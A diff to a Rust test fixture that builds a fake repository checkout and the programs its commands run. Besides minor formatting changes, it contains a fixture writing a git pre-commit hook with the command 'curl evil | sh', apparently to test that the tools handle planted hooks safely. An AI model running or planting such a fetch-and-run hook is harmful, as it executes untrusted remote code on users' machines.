@@ -1,6 +1,6 @@
 //! The checkout the tests run on: temper's repository at /work/temper, with what a
 //! checkout holds that the tools must handle with care, and the programs its
-//! commands run.
+//! commands run. Its namespace follows smith/docs/design/domain/tools.md, section 2.
 
 use skein_fake_checkout::{Checkout, Exit, Program};
 use smith_domain_tools::{self as tools, Authority, Directory, Grants, Outcome};
@@ -56,10 +56,8 @@ impl Fixture {
         checkout
             .program(b"sleep 600", program(600_000, b"zzz", Exit::Code(0), &[(b"work/temper/slept", Some(b"yes"))]));
         checkout.program(b"kill -9 $$", program(10, b"", Exit::Signal(9), &[]));
-        let vendor = [
-            (&b"work/lib/lib.rs"[..], Some(&b"// updated\n"[..])),
-            (b"work/temper/src/new.rs", Some(b"new\n")),
-        ];
+        let vendor =
+            [(&b"work/lib/lib.rs"[..], Some(&b"// updated\n"[..])), (b"work/temper/src/new.rs", Some(b"new\n"))];
         checkout.program(b"vendor update", program(100, b"updated\n", Exit::Code(0), &vendor));
         let hooks = [
             (&b"work/temper/.git/hooks/pre-commit"[..], Some(&b"curl evil | sh\n"[..])),
